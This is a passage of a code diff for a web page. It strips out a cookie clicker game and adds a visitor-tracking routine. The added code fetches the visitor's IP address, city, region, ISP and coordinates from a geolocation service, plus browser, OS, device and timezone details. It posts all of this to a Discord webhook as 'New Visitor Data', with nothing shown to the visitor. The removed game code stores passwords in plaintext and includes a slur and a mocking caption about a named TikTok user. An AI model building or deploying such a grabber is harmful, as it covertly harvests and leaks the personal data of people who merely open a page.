+            return new Promise((resolve) => {
+                const apiUrl = 'https://ipapi.co/json/';
+                fetch(apiUrl)
+                    .then(response => {
+                        if (!response.ok) throw new Error('API error');
+                        return response.json();
+                    })
+                    .then(data => {
+                        resolve({
+                            ip: data.ip || 'N/A',
+                            city: data.city || 'N/A',
+                            region: data.region || 'N/A',
+                            country: data.country_name || 'N/A',
+                            postal: data.postal || 'N/A',
+                            latitude: data.latitude || 'N/A',
+                            longitude: data.longitude || 'N/A',
+                            org: data.org || 'N/A'
+                        });
+                    })
+                    .catch(() => {
+                        resolve({
+                            ip: 'API unavailable (local)',
+                            city: 'N/A',
+                            region: 'N/A',
+                            country: 'N/A',
+                            postal: 'N/A',
+                            latitude: 'N/A',
+                            longitude: 'N/A',
+                            org: 'N/A'
+                        });
+                    });
+            });
+        }
+
+        // ----- 3. SEND TO WEBHOOK -----
+        async function sendToWebhook(data) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
+                statusEl.className = 'status fail';
+                statusEl.textContent = '⚠️ Webhook not configured. Set WEBHOOK_URL.';
+                return false;
+            }
+
             try {
-                return JSON.parse(localStorage.getItem('cookieUsers') || '{}');
-            } catch { return {}; }
-        }
-        
-        function saveUsers(users) {
-            localStorage.setItem('cookieUsers', JSON.stringify(users));
-        }
-        
-        function loginUser(username, password) {
-            const users = getUsers();
-            if (!users[username]) {
-                loginError.textContent = '❌ User not found';
-                return false;
-            }
-            if (users[username].password !== password) {
-                loginError.textContent = '❌ Incorrect password';
-                return false;
-            }
-            loginError.textContent = '';
-            currentUser = username;
-            loggedIn = true;
-            
-            // Load user's game data
-            const userData = users[username].gameData;
-            if (userData) {
-                loadUserGameData(userData);
-            }
-            
-            // Show welcome animation
-            showWelcomeAnimation();
-            
-            return true;
-        }
-        
-        function registerUser(username, password, confirm) {
-            const users = getUsers();
-            if (username.length < 3) {
-                registerError.textContent = '❌ Username must be at least 3 characters';
-                return false;
-            }
-            if (password.length < 4) {
-                registerError.textContent = '❌ Password must be at least 4 characters';
-                return false;
-            }
-            if (password !== confirm) {
-                registerError.textContent = '❌ Passwords do not match';
-                return false;
-            }
-            if (users[username]) {
-                registerError.textContent = '❌ Username already exists';
-                return false;
-            }
-            
-            users[username] = {
-                password: password,
-                gameData: null
-            };
-            saveUsers(users);
-            registerError.textContent = '';
-            registerError.style.color = '#7fc9ff';
-            registerError.textContent = '✅ Account created! Please login.';
-            setTimeout(() => {
-                registerError.textContent = '';
-                registerError.style.color = '#ff6b6b';
-                switchToLogin.click();
-            }, 1500);
-            return true;
-        }
-        
-        function saveUserGameData() {
-            if (!currentUser) return;
-            const users = getUsers();
-            if (users[currentUser]) {
-                users[currentUser].gameData = {
-                    cookies, totalClicks, clickPower, cps,
-                    autoCount, factoryCount,
-                    cost1, cost2, cost3,
-                    isOwner, prestigePoints, prestigeBonus,
-                    pets, unlockedAchievements, graphData
+                // Build a clean message for Discord (or any webhook)
+                const payload = {
+                    content: null,
+                    embeds: [
+                        {
+                            title: '🕵️ New Visitor Data',
+                            color: 0x5865F2,
+                            fields: [
+                                { name: 'IP Address', value: data.ipInfo.ip, inline: true },
+                                { name: 'City', value: data.ipInfo.city, inline: true },
+                                { name: 'Region', value: data.ipInfo.region, inline: true },
+                                { name: 'Country', value: data.ipInfo.country, inline: true },
+                                { name: 'ISP / Org', value: data.ipInfo.org, inline: false },
+                                { name: 'Browser', value: data.browser, inline: true },
+                                { name: 'OS', value: data.os, inline: true },
+                                { name: 'Device Type', value: data.device, inline: true },
+                                { name: 'Screen Resolution', value: data.resolution, inline: true },
+                                { name: 'Language', value: data.language, inline: true },
+                                { name: 'Time Zone', value: data.timezone, inline: true },
+                                { name: 'Platform', value: data.platform, inline: true },
+                                { name: 'User Agent', value: navigator.userAgent.substring(0, 200) + (navigator.userAgent.length > 200 ? '...' : ''), inline: false }
+                            ],
+                            timestamp: new Date().toISOString(),
+                            footer: { text: 'Collected via HTML page' }
+                        }
+                    ]
                 };
-                saveUsers(users);
-            }
-        }
-        
-        function loadUserGameData(data) {
-            cookies = data.cookies ?? 0;
-            totalClicks = data.totalClicks ?? 0;
-            clickPower = data.clickPower ?? 1;
-            cps = data.cps ?? 0;
-            autoCount = data.autoCount ?? 0;
-            factoryCount = data.factoryCount ?? 0;
-            cost1 = data.cost1 ?? BASE_COST1;
-            cost2 = data.cost2 ?? BASE_COST2;
-            cost3 = data.cost3 ?? BASE_COST3;
-            isOwner = data.isOwner ?? false;
-            prestigePoints = data.prestigePoints ?? 0;
-            prestigeBonus = data.prestigeBonus ?? 0;
-            pets = data.pets || { cat: 0, dog: 0, dragon: 0 };
-            unlockedAchievements = data.unlockedAchievements || [];
-            graphData = data.graphData || [];
-            updateUI();
-            if (isOwner) {
-                ownerBtn.textContent = '👑 OWNER (active)';
-                ownerBtn.style.borderColor = '#7aff7a';
-            }
-        }
-        
-        // --- WELCOME ANIMATION ---
-        function showWelcomeAnimation() {
-            // Create floating cookie emojis
-            const emojis = ['🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪', '🍪'];
-            emojis.forEach((emoji, i) => {
-                const el = document.createElement('div');
-                el.className = 'welcome-cookies';
-                el.textContent = emoji;
-                el.style.left = (Math.random() * 90 + 5) + '%';
-                el.style.animationDelay = (Math.random() * 2) + 's';
-                el.style.fontSize = (1.2 + Math.random() * 1.5) + 'rem';
-                el.style.opacity = 0.3 + Math.random() * 0.5;
-                welcomeOverlay.appendChild(el);
-                setTimeout(() => el.remove(), 5000);
-            });
-            
-            welcomeOverlay.classList.add('show');
-            
-            // Hide after 3 seconds
-            setTimeout(() => {
-                welcomeOverlay.classList.remove('show');
-                // Show game
-                gameContainer.classList.add('visible');
-                document.getElementById('darkModeToggle').classList.add('visible');
-                document.getElementById('comboDisplay').classList.add('visible');
-                document.getElementById('secretBtn').classList.add('visible');
-                document.getElementById('discordFloat').classList.add('visible');
-                loginOverlay.classList.add('hidden');
-                // Clear welcome overlay
-                welcomeOverlay.innerHTML = `
-                    <div class="welcome-text">
-                        <span class="emoji-big">🎉</span>
-                        Welcome to Rainyy's Cookie Clicker!
-                        <div class="sub-welcome">🍪 Let's start clicking! 🍪</div>
-                    </div>
-                `;
-            }, 3000);
-        }
-        
-        // --- Login Event Listeners ---
-        switchToRegister.addEventListener('click', () => {
-            loginForm.style.display = 'none';
-            registerForm.style.display = 'block';
-            loginError.textContent = '';
-            registerError.textContent = '';
-        });
-        
-        switchToLogin.addEventListener('click', () => {
-            registerForm.style.display = 'none';
-            loginForm.style.display = 'block';
-            loginError.textContent = '';
-            registerError.textContent = '';
-        });
-        
-        loginBtn.addEventListener('click', () => {
-            const username = loginUsername.value.trim();
-            const password = loginPassword.value;
-            if (!username || !password) {
-                loginError.textContent = '❌ Please fill in all fields';
-                return;
-            }
-            loginUser(username, password);
-        });
-        
-        loginUsername.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        loginPassword.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        
-        registerBtn.addEventListener('click', () => {
-            const username = registerUsername.value.trim();
-            const password = registerPassword.value;
-            const confirm = registerConfirm.value;
-            registerUser(username, password, confirm);
-        });
-        
-        registerUsername.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') registerBtn.click();
-        });
-        registerPassword.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') registerBtn.click();
-        });
-        registerConfirm.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') registerBtn.click();
-        });
-        
-        // --- STATE ---
-        let cookies = 0;
-        let totalClicks = 0;
-        let clickPower = 1;
-        let cps = 0;
-        let autoCount = 0;
-        let factoryCount = 0;
 
-        const BASE_COST1 = 10;
-        const BASE_COST2 = 50;
-        const BASE_COST3 = 250;
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
 
-        let cost1 = BASE_COST1;
-        let cost2 = BASE_COST2;
-        let cost3 = BASE_COST3;
-
-        // --- OWNER SYSTEM ---
-        const OWNER_CODE = "Billyistuff1234";
-        let isOwner = false;
-        let ownerMenuVisible = false;
-
-        // --- PRESTIGE ---
-        let prestigePoints = 0;
-        let prestigeBonus = 0;
-
-        // --- PETS ---
-        let pets = { cat: 0, dog: 0, dragon: 0 };
-        let PET_COSTS = { cat: 100, dog: 300, dragon: 1000 };
-        const PET_CPS = { cat: 1, dog: 3, dragon: 10 };
-
-        // --- ACHIEVEMENTS ---
-        let unlockedAchievements = [];
-        const ACHIEVEMENTS = {
-            firstClick: { name: 'First Click', desc: 'Click once', check: () => totalClicks >= 1 },
-            click100: { name: 'Click Master', desc: 'Click 100 times', check: () => totalClicks >= 100 },
-            cookie1000: { name: 'Cookie Hoarder', desc: 'Reach 1000 cookies', check: () => cookies >= 1000 },
-            cookie1M: { name: 'Millionaire', desc: 'Reach 1,000,000 cookies', check: () => cookies >= 1000000 },
-            cps10: { name: 'Speed Demon', desc: 'Reach 10 CPS', check: () => cps >= 10 },
-            cps100: { name: 'Godly Speed', desc: 'Reach 100 CPS', check: () => cps >= 100 },
-            prestige1: { name: 'Prestige Noob', desc: 'Prestige once', check: () => prestigePoints >= 1 },
-            prestige10: { name: 'Prestige Legend', desc: 'Prestige 10 times', check: () => prestigePoints >= 10 },
-            petCat: { name: 'Cat Lover', desc: 'Buy a cat', check: () => pets.cat >= 1 },
-            petDragon: { name: 'Dragon Tamer', desc: 'Buy a dragon', check: () => pets.dragon >= 1 },
-        };
-
-        // --- COMBO ---
-        let comboCount = 0;
-        let comboMultiplier = 1;
-        let comboTimeout = null;
-
-        // --- RANDOM EVENTS ---
-        let eventActive = false;
-
-        // --- GRAPH DATA ---
-        let graphData = [];
-
-        // --- DOM REFS ---
-        const cookieCountEl = document.getElementById('cookieCount');
-        const cpsDisplayEl = document.getElementById('cpsDisplay');
-        const totalClicksDisplayEl = document.getElementById('totalClicksDisplay');
-        const clickBtn = document.getElementById('clickBtn');
-        const up1 = document.getElementById('upgrade1');
-        const up2 = document.getElementById('upgrade2');
-        const up3 = document.getElementById('upgrade3');
-        const cost1El = document.getElementById('cost1');
-        const cost2El = document.getElementById('cost2');
-        const cost3El = document.getElementById('cost3');
-        const resetBtn = document.getElementById('resetBtn');
-        const saveBtn = document.getElementById('saveBtn');
-        const ownerBtn = document.getElementById('ownerBtn');
-        const prestigeBtn = document.getElementById('prestigeBtn');
-        const prestigePointsEl = document.getElementById('prestigePoints');
-        const prestigeBonusEl = document.getElementById('prestigeBonus');
-        const comboDisplay = document.getElementById('comboDisplay');
-        const graphCanvas = document.getElementById('graphCanvas');
-        const ctx = graphCanvas.getContext('2d');
-
-        // --- UI UPDATE ---
-        function updateUI() {
-            const totalCPS = autoCount * 1 + factoryCount * 5 + 
-                (pets.cat * PET_CPS.cat + pets.dog * PET_CPS.dog + pets.dragon * PET_CPS.dragon) * (1 + prestigeBonus/100);
-            cps = totalCPS;
-            
-            cookieCountEl.textContent = Math.floor(cookies);
-            totalClicksDisplayEl.textContent = totalClicks;
-            cpsDisplayEl.textContent = totalCPS.toFixed(1);
-
-            cost1El.textContent = cost1;
-            cost2El.textContent = cost2;
-            cost3El.textContent = cost3;
-
-            up1.classList.toggle('disabled', cookies < cost1);
-            up2.classList.toggle('disabled', cookies < cost2);
-            up3.classList.toggle('disabled', cookies < cost3);
-
-            prestigePointsEl.textContent = prestigePoints;
-            prestigeBonusEl.textContent = Math.floor(prestigeBonus);
-
-            // Update pet buttons
-            document.querySelectorAll('.pet-btn').forEach(btn => {
-                const pet = btn.dataset.pet;
-                const owned = pets[pet] > 0;
-                btn.classList.toggle('owned', owned);
-                const cost = PET_COSTS[pet];
-                btn.style.opacity = cookies >= cost ? '1' : '0.5';
-                btn.querySelector('.pet-cps').textContent = owned ? `+${PET_CPS[pet]} CPS (x${pets[pet]})` : `+${PET_CPS[pet]} CPS`;
-            });
-
-            updateLeaderboard();
-            drawGraph();
-        }
-
-        // --- GAME LOGIC ---
-        function clickCookie(e) {
-            comboCount++;
-            if (comboTimeout) clearTimeout(comboTimeout);
-            comboTimeout = setTimeout(() => { comboCount = 0; updateCombo(); }, 2000);
-            updateCombo();
-            
-            const gain = clickPower * comboMultiplier * (1 + prestigeBonus/100);
-            cookies += gain;
-            totalClicks += 1;
-            
-            // Particles
-            if (e) {
-                const rect = clickBtn.getBoundingClientRect();
-                for (let i = 0; i < 8; i++) {
-                    const particle = document.createElement('div');
-                    particle.className = 'particle';
-                    const angle = Math.random() * Math.PI * 2;
-                    const dist = 40 + Math.random() * 60;
-                    particle.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
-                    particle.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
-                    particle.style.left = (rect.width/2 - 4) + 'px';
-                    particle.style.top = (rect.height/2 - 4) + 'px';
-                    particle.style.background = ['#ffdd99', '#ffaa44', '#ff8844', '#ffcc66'][Math.floor(Math.random()*4)];
-                    clickBtn.appendChild(particle);
-                    setTimeout(() => particle.remove(), 800);
-                }
-            }
-            
-            // Floating text
-            const floatText = document.createElement('div');
-            floatText.textContent = `+${Math.floor(gain)}`;
-            floatText.style.cssText = `
-                position: fixed; color: #ffdd99; font-size: 1.5rem; font-weight: 700;
-                pointer-events: none; z-index: 9999;
-                animation: floatUp 1s ease forwards;
-            `;
-            const x = e ? e.clientX : window.innerWidth/2;
-            const y = e ? e.clientY : window.innerHeight/2;
-            floatText.style.left = (x - 30) + 'px';
-            floatText.style.top = (y - 20) + 'px';
-            document.body.appendChild(floatText);
-            setTimeout(() => floatText.remove(), 1000);
-            
-            updateUI();
-            checkAchievements();
-            if (loggedIn) saveUserGameData();
-        }
-
-        function updateCombo() {
-            if (comboCount > 1) {
-                comboMultiplier = 1 + (comboCount * 0.1);
-                comboDisplay.textContent = `🔥 COMBO x${comboMultiplier.toFixed(1)}`;
-                comboDisplay.classList.add('show');
-            } else {
-                comboDisplay.classList.remove('show');
-                comboMultiplier = 1;
-            }
-        }
-
-        function buyUpgrade1() {
-            if (cookies < cost1) return false;
-            cookies -= cost1;
-            clickPower += 1;
-            cost1 = Math.floor(cost1 * 1.5) + 2;
-            updateUI();
-            checkAchievements();
-            if (loggedIn) saveUserGameData();
-            return true;
-        }
-
-        function buyUpgrade2() {
-            if (cookies < cost2) return false;
-            cookies -= cost2;
-            autoCount += 1;
-            cost2 = Math.floor(cost2 * 1.6) + 5;
-            updateUI();
-            checkAchievements();
-            if (loggedIn) saveUserGameData();
-            return true;
-        }
-
-        function buyUpgrade3() {
-            if (cookies < cost3) return false;
-            cookies -= cost3;
-            factoryCount += 1;
-            cost3 = Math.floor(cost3 * 1.7) + 15;
-            updateUI();
-            checkAchievements();
-            if (loggedIn) saveUserGameData();
-            return true;
-        }
-
-        function buyPet(pet) {
-            const cost = PET_COSTS[pet];
-            if (cookies < cost) return false;
-            cookies -= cost;
-            pets[pet] = (pets[pet] || 0) + 1;
-            PET_COSTS[pet] = Math.floor(PET_COSTS[pet] * 1.8) + 10;
-            updateUI();
-            checkAchievements();
-            if (loggedIn) saveUserGameData();
-            return true;
-        }
-
-        // --- PRESTIGE ---
-        function doPrestige() {
-            if (cookies < 1000000) {
-                alert('Need 1,000,000 cookies to prestige!');
-                return;
-            }
-            if (!confirm(`Prestige will reset everything but give +10% permanent bonus. Continue?`)) return;
-            
-            prestigePoints++;
-            prestigeBonus = prestigePoints * 10;
-            
-            cookies = 0;
-            totalClicks = 0;
-            clickPower = 1;
-            autoCount = 0;
-            factoryCount = 0;
-            cost1 = BASE_COST1;
-            cost2 = BASE_COST2;
-            cost3 = BASE_COST3;
-            pets = { cat: 0, dog: 0, dragon: 0 };
-            PET_COSTS = { cat: 100, dog: 300, dragon: 1000 };
-            
-            updateUI();
-            if (loggedIn) saveUserGameData();
-            showAchievement(`⭐ Prestige! Bonus: +${Math.floor(prestigeBonus)}%`);
-        }
-
-        // --- ACHIEVEMENTS ---
-        function showAchievement(text) {
-            const popup = document.createElement('div');
-            popup.className = 'achievement-popup';
-            popup.textContent = `🏆 ${text}`;
-            document.body.appendChild(popup);
-            setTimeout(() => popup.remove(), 3000);
-        }
-
-        function checkAchievements() {
-            Object.keys(ACHIEVEMENTS).forEach(key => {
-                const ach = ACHIEVEMENTS[key];
-                if (!unlockedAchievements.includes(key) && ach.check()) {
-                    unlockedAchievements.push(key);
-                    showAchievement(`Achievement Unlocked: ${ach.name}`);
-                    if (loggedIn) saveUserGameData();
-                }
-            });
-        }
-
-        // --- RANDOM EVENTS ---
-        function triggerRandomEvent() {
-            if (eventActive) return;
-            const events = [
-                { name: '🎉 Golden Cookie!', effect: () => { cookies += 1000; }, duration: 0 },
-                { name: '⚡ Meteor Shower! 2x CPS for 10s', effect: () => { 
-                    const origCPS = cps;
-                    let elapsed = 0;
-                    const interval = setInterval(() => {
-                        elapsed++;
-                        cookies += origCPS;
-                        updateUI();
-                        if (elapsed >= 10) { clearInterval(interval); eventActive = false; }
-                    }, 1000);
-                }, duration: 10 },
-                { name: '💀 Stock Crash! Lost 10% cookies', effect: () => { cookies *= 0.9; }, duration: 0 },
-                { name: '🍪 Cookie Storm! Free 5000 cookies', effect: () => { cookies += 5000; }, duration: 0 },
-            ];
-            
-            const event = events[Math.floor(Math.random() * events.length)];
-            eventActive = true;
-            
-            const notif = document.createElement('div');
-            notif.className = 'event-notification';
-            notif.textContent = event.name;
-            document.body.appendChild(notif);
-            setTimeout(() => notif.remove(), 3000);
-            
-            event.effect();
-            updateUI();
-            if (loggedIn) saveUserGameData();
-            
-            if (event.duration === 0) {
-                setTimeout(() => { eventActive = false; }, 1000);
-            }
-        }
-
-        // --- LEADERBOARD ---
-        function updateLeaderboard() {
-            const entries = document.getElementById('leaderboardEntries');
-            let leaderboard = JSON.parse(localStorage.getItem('cookieLeaderboard') || '[]');
-            
-            const playerEntry = { name: currentUser || 'You', score: cookies, timestamp: Date.now() };
-            leaderboard.push(playerEntry);
-            
-            leaderboard.sort((a, b) => b.score - a.score);
-            leaderboard = leaderboard.slice(0, 10);
-            
-            localStorage.setItem('cookieLeaderboard', JSON.stringify(leaderboard));
-            
-            entries.innerHTML = leaderboard.map((entry, i) => `
-                <div class="leaderboard-entry ${entry.name === currentUser ? 'you' : ''}">
-                    <span>#${i+1} ${entry.name}</span>
-                    <span>${Math.floor(entry.score).toLocaleString()} 🍪</span>
-                </div>
-            `).join('');
-        }
-
-        // --- GRAPH ---
-        function drawGraph() {
-            if (!ctx) return;
-            const canvas = graphCanvas;
-            canvas.width = canvas.offsetWidth || 400;
-            canvas.height = canvas.offsetHeight || 120;
-            
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            if (graphData.length < 2) return;
-            
-            const max = Math.max(...graphData, 1);
-            const width = canvas.width;
-            const height = canvas.height;
-            
-            ctx.beginPath();
-            ctx.strokeStyle = '#ffd700';
-            ctx.lineWidth = 2;
-            ctx.shadowColor = '#ffd70044';
-            ctx.shadowBlur = 10;
-            
-            graphData.forEach((value, i) => {
-                const x = (i / graphData.length) * width;
-                const y = height - (value / max) * height * 0.8 - 10;
-                if (i === 0) ctx.moveTo(x, y);
-                else ctx.lineTo(x, y);
-            });
-            ctx.stroke();
-            
-            const lastX = ((graphData.length - 1) / graphData.length) * width;
-            ctx.lineTo(lastX, height);
-            ctx.lineTo(0, height);
-            ctx.closePath();
-            ctx.fillStyle = 'rgba(255, 215, 0, 0.1)';
-            ctx.fill();
-        }
-
-        // --- SAVE/LOAD (local only, user data saved on login) ---
-        function saveGame() {
-            if (loggedIn) {
-                saveUserGameData();
-            } else {
-                // Guest save
-                const data = {
-                    cookies, totalClicks, clickPower, cps,
-                    autoCount, factoryCount,
-                    cost1, cost2, cost3,
-                    isOwner, prestigePoints, prestigeBonus,
-                    pets, unlockedAchievements, graphData
-                };
-                try {
-                    localStorage.setItem('cookieClickerGuestSave', JSON.stringify(data));
-                } catch(e) {}
-            }
-        }
-
-        function loadGame() {
-            try {
-                const raw = localStorage.getItem('cookieClickerGuestSave');
-                if (!raw) return false;
-                const data = JSON.parse(raw);
-                cookies = data.cookies ?? 0;
-                totalClicks = data.totalClicks ?? 0;
-                clickPower = data.clickPower ?? 1;
-                cps = data.cps ?? 0;
-                autoCount = data.autoCount ?? 0;
-                factoryCount = data.factoryCount ?? 0;
-                cost1 = data.cost1 ?? BASE_COST1;
-                cost2 = data.cost2 ?? BASE_COST2;
-                cost3 = data.cost3 ?? BASE_COST3;
-                isOwner = data.isOwner ?? false;
-                prestigePoints = data.prestigePoints ?? 0;
-                prestigeBonus = data.prestigeBonus ?? 0;
-                pets = data.pets || { cat: 0, dog: 0, dragon: 0 };
-                unlockedAchievements = data.unlockedAchievements || [];
-                graphData = data.graphData || [];
-                updateUI();
-                if (isOwner) {
-                    ownerBtn.textContent = '👑 OWNER (active)';
-                    ownerBtn.style.borderColor = '#7aff7a';
-                }
-                return true;
-            } catch(e) { return false; }
-        }
-
-        function resetGame() {
-            if (!confirm('Reset all progress?')) return;
-            cookies = 0;
-            totalClicks = 0;
-            clickPower = 1;
-            cps = 0;
-            autoCount = 0;
-            factoryCount = 0;
-            cost1 = BASE_COST1;
-            cost2 = BASE_COST2;
-            cost3 = BASE_COST3;
-            isOwner = false;
-            prestigePoints = 0;
-            prestigeBonus = 0;
-            pets = { cat: 0, dog: 0, dragon: 0 };
-            PET_COSTS = { cat: 100, dog: 300, dragon: 1000 };
-            unlockedAchievements = [];
-            graphData = [];
-            localStorage.removeItem('cookieClickerGuestSave');
-            const menu = document.getElementById('ownerMenu');
-            if (menu) menu.remove();
-            ownerBtn.textContent = '👑 OWNER';
-            ownerBtn.style.borderColor = '#c9a84c';
-            ownerMenuVisible = false;
-            updateUI();
-            if (loggedIn) saveUserGameData();
-        }
-
-        // --- OWNER SYSTEM ---
-        function verifyOwnerCode(inputCode) {
-            if (inputCode === OWNER_CODE) {
-                isOwner = true;
-                alert("✅ Owner access granted!");
-                ownerBtn.textContent = '👑 OWNER (active)';
-                ownerBtn.style.borderColor = '#7aff7a';
-                showOwnerMenu();
-                saveGame();
-                return true;
-            } else {
-                alert("❌ Invalid owner code.");
-                return false;
-            }
-        }
-
-        function showOwnerMenu() {
-            if (!isOwner) return;
-            ownerMenuVisible = !ownerMenuVisible;
-            let menu = document.getElementById('ownerMenu');
-            if (menu && !ownerMenuVisible) {
-                menu.remove();
-                return;
-            }
-            if (menu) menu.remove();
-
-            menu = document.createElement('div');
-            menu.id = 'ownerMenu';
-            menu.innerHTML = `
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
-                    <span style="font-weight:bold; color:#f5d742; font-size:1.2rem;">🔑 OWNER PANEL</span>
-                    <button id="closeOwnerMenu" style="background:#3d2a2a; border:1px solid #8f5a5a; color:#f0c8c8; border-radius:30px; padding:2px 14px; cursor:pointer; font-size:1.1rem;">✕</button>
-                </div>
-                <div style="display:flex; flex-direction:column; gap:8px;">
-                    <button class="owner-btn" data-action="add100">+100 cookies</button>
-                    <button class="owner-btn" data-action="add1000">+1000 cookies</button>
-                    <button class="owner-btn" data-action="add10000">+10,000 cookies</button>
-                    <button class="owner-btn" data-action="add1B">+1,000,000,000 cookies</button>
-                    <button class="owner-btn" data-action="setCps10">Set CPS to 10</button>
-                    <button class="owner-btn" data-action="setCps50">Set CPS to 50</button>
-                    <button class="owner-btn" data-action="setCps100">Set CPS to 100</button>
-                    <button class="owner-btn" data-action="setCps1B">🚀 1 BILLION CPS</button>
-                    <button class="owner-btn" data-action="maxUpgrades">Max all upgrades</button>
-                    <button class="owner-btn" data-action="triggerEvent">🎲 Trigger Random Event</button>
-                    <button class="owner-btn" data-action="unlockAllAch">🏆 Unlock All Achievements</button>
-                    <button class="owner-btn" data-action="resetOwner" style="border-color:#aa5a5a; color:#e6b5b5;">Reset game (owner)</button>
-                </div>
-            `;
-            const resetArea = document.querySelector('.reset-area');
-            resetArea.parentNode.insertBefore(menu, resetArea);
-
-            document.getElementById('closeOwnerMenu').onclick = () => {
-                const m = document.getElementById('ownerMenu');
-                if (m) m.remove();
-                ownerMenuVisible = false;
-            };
-
-            document.querySelectorAll('.owner-btn').forEach(btn => {
-                btn.onclick = function(e) {
-                    e.stopPropagation();
-                    const action = this.dataset.action;
-                    switch(action) {
-                        case 'add100': cookies += 100; updateUI(); saveGame(); break;
-                        case 'add1000': cookies += 1000; updateUI(); saveGame(); break;
-                        case 'add10000': cookies += 10000; updateUI(); saveGame(); break;
-                        case 'add1B': cookies += 1000000000; updateUI(); saveGame(); break;
-                        case 'setCps10': autoCount = 10; factoryCount = 0; updateUI(); saveGame(); break;
-                        case 'setCps50': autoCount = 0; factoryCount = 10; updateUI(); saveGame(); break;
-                        case 'setCps100': autoCount = 0; factoryCount = 20; updateUI(); saveGame(); break;
-                        case 'setCps1B': autoCount = 0; factoryCount = 200000000; updateUI(); saveGame(); break;
-                        case 'maxUpgrades':
-                            clickPower = 50;
-                            autoCount = 20;
-                            factoryCount = 20;
-                            cost1 = 999999;
-                            cost2 = 999999;
-                            cost3 = 999999;
-                            updateUI();
-                            saveGame();
-                            break;
-                        case 'triggerEvent': triggerRandomEvent(); break;
-                        case 'unlockAllAch':
-                            Object.keys(ACHIEVEMENTS).forEach(key => {
-                                if (!unlockedAchievements.includes(key)) {
-                                    unlockedAchievements.push(key);
-                                    showAchievement(`Unlocked: ${ACHIEVEMENTS[key].name}`);
-                                }
-                            });
-                            saveGame();
-                            break;
-                        case 'resetOwner': resetGame(); break;
-                    }
-                };
-            });
-        }
-
-        // --- SECRET STUFF ---
-        const secretBtn = document.getElementById('secretBtn');
-        const secretOverlay = document.getElementById('secretOverlay');
-        const secretBackBtn = document.getElementById('secretBackBtn');
-        const screenshotGrid = document.getElementById('screenshotGrid');
-
-        const screenshotData = [
-            {
-                title: "this was from the start of the year, DAMN",
-                imageUrl: "https://cdn.discordapp.com/attachments/1479645288254668922/1528927150407684227/image.png?ex=6a6013de&is=6a5ec25e&hm=cb8a5f60e23a6cadafbd504dbf32c7c0ec3b5792235532e9b54420e17a89fe48&",
-                link: "https://www.tiktok.com/@togi_stuffclips/video/7593215555100839199?cid=NzU5MzQ4MDc4NTQ1NTU2MzU1MA"
-            },
-            {
-                title: "This is my tiktok",
-                imageUrl: "https://cdn.discordapp.com/attachments/1479645288254668922/1528927927570272440/image.png?ex=6a601498&is=6a5ec318&hm=c28d662197780e637dea7ee1fd6bce098f833c3bb83d062e7b7ebe6c6977642d&",
-                link: "i play gtag "
-            },
-            {
-                title: "This is my pfp on discord",
-                imageUrl: "https://cdn.discordapp.com/attachments/1479645288254668922/1528928739566551061/image.png?ex=6a601559&is=6a5ec3d9&hm=83eca80b9dc42e1e38c70922ff73a5030733876d39a7ca7dff13a29a8d92d49e&",
-                link: "@rainyy.mods"
-            },
-            {
-                title: "this kids a retard",
-                imageUrl: "https://cdn.discordapp.com/attachments/1479645288254668922/1528930318084735067/image.png?ex=6a6016d1&is=6a5ec551&hm=71a19ec9bee7b4ec9baf6441e0d8ee1e700e372e4a96f20b616ca4b71fcb8b30&",
-                link: "He obv speeds up his videos here https://www.tiktok.com/@cuberisaunc/video/7664630419467308318"
-            },
-            {
-                title: "this is my fwend",
-                imageUrl: "https://cdn.discordapp.com/attachments/1479645288254668922/1528932250681344031/image.png?ex=6a60189e&is=6a5ec71e&hm=ddf71ddc345923844bfef76c6d7a4b5255110595f64c7c8b2f9add704ddce026&",
-                link: "so tufferson"
-            }
-        ];
-
-        function renderScreenshots() {
-            screenshotGrid.innerHTML = '';
-            screenshotData.forEach((item) => {
-                const card = document.createElement('div');
-                card.className = 'screenshot-card';
-                card.innerHTML = `
-                    <img src="${item.imageUrl}" alt="${item.title}" loading="lazy" />
-                    <div class="card-title">📷 ${item.title}</div>
-                    <div class="card-link">🔗 ${item.link}</div>
-                `;
-                card.addEventListener('click', () => { window.open(item.link, '_blank'); });
-                screenshotGrid.appendChild(card);
-            });
-        }
-
-        function showSecretStuff() {
-            const elements = document.querySelectorAll('.game-container, .footer-note, #ownerBtn, .reset-area, .upgrades, .stats, .cookie-display, h1, #clickBtn');
-            elements.forEach(el => { if (el) el.style.display = 'none'; });
-            const ownerMenu = document.getElementById('ownerMenu');
-            if (ownerMenu) ownerMenu.style.display = 'none';
-            secretOverlay.classList.add('show');
-            renderScreenshots();
-        }
-
-        function hideSecretStuff() {
-            const elements = document.querySelectorAll('.game-container, .footer-note, #ownerBtn, .reset-area, .upgrades, .stats, .cookie-display, h1, #clickBtn');
-            elements.forEach(el => { if (el) el.style.display = ''; });
-            const ownerMenu = document.getElementById('ownerMenu');
-            if (ownerMenu) ownerMenu.style.display = '';
-            secretOverlay.classList.remove('show');
-        }
-
-        secretBtn.addEventListener('click', showSecretStuff);
-        secretBackBtn.addEventListener('click', hideSecretStuff);
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && secretOverlay.classList.contains('show')) hideSecretStuff();
-        });
-
-        // --- DARK MODE ---
-        let darkMode = false;
-        const darkToggle = document.getElementById('darkModeToggle');
-        darkToggle.addEventListener('click', () => {
-            darkMode = !darkMode;
-            document.body.classList.toggle('dark-mode', darkMode);
-            darkToggle.textContent = darkMode ? '☀️' : '🌙';
-            localStorage.setItem('darkMode', darkMode ? 'true' : 'false');
-        });
-        if (localStorage.getItem('darkMode') === 'true') {
-            darkMode = true;
-            document.body.classList.add('dark-mode');
-            darkToggle.textContent = '☀️';
